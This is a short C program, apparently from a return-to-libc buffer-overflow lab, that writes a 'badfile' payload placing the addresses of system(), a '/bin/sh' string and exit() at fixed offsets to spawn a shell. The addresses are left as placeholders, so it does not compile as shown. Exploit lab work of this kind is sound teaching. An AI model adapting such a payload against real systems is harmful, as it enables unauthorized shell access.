#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	char buf[52];
	FILE *badfile;
	memset(buf, 1, sizeof(buf)); badfile = fopen("./badfile", "w");
	*(long *) &buf[16] = some address ; //system() call
	*(long *) &buf[20] = 0x1234; //address of "/bin/sh" string on stack
	*(long *) &buf[24] = some address ; //exit()
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
